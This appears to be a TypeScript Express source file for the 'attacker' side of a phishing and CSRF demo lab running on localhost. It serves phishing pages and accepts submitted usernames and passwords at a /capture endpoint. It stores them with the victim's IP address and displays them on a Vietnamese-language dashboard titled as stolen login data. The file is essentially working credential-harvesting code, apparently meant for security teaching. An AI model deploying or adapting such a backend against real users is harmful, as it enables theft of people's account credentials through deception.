import express, { type Express } from 'express';
import path from 'node:path';
import { addCaptured, capturedCredentials, clearCaptured } from './capture.js';

export function createAttackerApp(): Express {
  const app = express();

  app.use(express.urlencoded({ extended: false }));
  app.use(express.json());

  // Serve phishing and CSRF static pages
  app.use(express.static(path.resolve('attacker/views')));
  app.use(express.static(path.resolve('attacker')));

  app.get('/', (_req, res) => {
    res.redirect('/phishing.html');
  });

  app.post('/capture', (req, res) => {
    const body = req.body as Record<string, unknown> | undefined;
    const username = typeof body?.['username'] === 'string' ? body['username'] : '';
    const password = typeof body?.['password'] === 'string' ? body['password'] : '';
    const ip = req.ip || req.socket.remoteAddress || 'unknown';

    if (username || password) {
      addCaptured({ username, password, ip });
    }

    res.redirect('/captured');
  });

  app.get('/captured', (_req, res) => {
    const rowsHtml =
      capturedCredentials.length === 0
        ? '<tr><td colspan="4" style="text-align: center; color: #64748b; padding: 2rem;">Chưa có thông tin đăng nhập nào được ghi nhận.</td></tr>'
        : capturedCredentials
            .map(
              (c) => `<tr>
            <td style="padding: 0.75rem 1rem; border-top: 1px solid #e2e8f0;">${escapeHtml(c.timestamp)}</td>
            <td style="padding: 0.75rem 1rem; border-top: 1px solid #e2e8f0; font-family: monospace; font-weight: 600;">${escapeHtml(c.username)}</td>
            <td style="padding: 0.75rem 1rem; border-top: 1px solid #e2e8f0; font-family: monospace; color: #b42318;">${escapeHtml(c.password)}</td>
            <td style="padding: 0.75rem 1rem; border-top: 1px solid #e2e8f0; color: #64748b;">${escapeHtml(c.ip)}</td>
          </tr>`,
            )
            .join('\n');

    const html = `<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dữ liệu thông tin đăng nhập đã đánh cắp</title>
  <style>
    body { font-family: system-ui, -apple-system, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 2rem; }
    .wrap { max-width: 56rem; margin: 0 auto; }
    h1 { font-size: 1.8rem; margin-bottom: 0.5rem; color: #f87171; }
    p { color: #94a3b8; margin-bottom: 1.5rem; }
    table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; border: 1px solid #334155; }
    th { text-align: left; padding: 0.75rem 1rem; background: #0f172a; color: #cbd5e1; font-weight: 600; font-size: 0.9rem; }
    .actions { margin-top: 1.5rem; }
    a.btn { display: inline-block; padding: 0.6rem 1rem; background: #2563eb; color: #fff; text-decoration: none; border-radius: 6px; font-weight: 600; }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>🎯 Bảng điều khiển kẻ tấn công: Thông tin đăng nhập đã thu thập</h1>
    <p>Các tài khoản người dùng gửi vào form lừa đảo <code>http://localhost:4000/phishing.html</code> được lưu trữ dưới đây:</p>
    <table>
      <thead>
        <tr>
          <th>Thời gian</th>
          <th>Tên đăng nhập</th>
          <th>Mật khẩu</th>
          <th>Địa chỉ IP</th>
        </tr>
      </thead>
      <tbody>
        ${rowsHtml}
      </tbody>
    </table>
    <div class="actions">
      <a class="btn" href="/phishing.html">← Quay lại trang Phishing</a>
    </div>
  </div>
</body>
</html>`;

    res.send(html);
  });

  return app;
}

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

export const clearCapturedStore = clearCaptured;

// Direct execution
if (import.meta.url === `file://${process.argv[1]}`) {
  const port = process.env['ATTACKER_PORT'] ? parseInt(process.env['ATTACKER_PORT'], 10) : 4000;
  const app = createAttackerApp();
  app.listen(port, () => {
    console.log(`[Attacker] Server running at http://localhost:${port}`);
  });
}
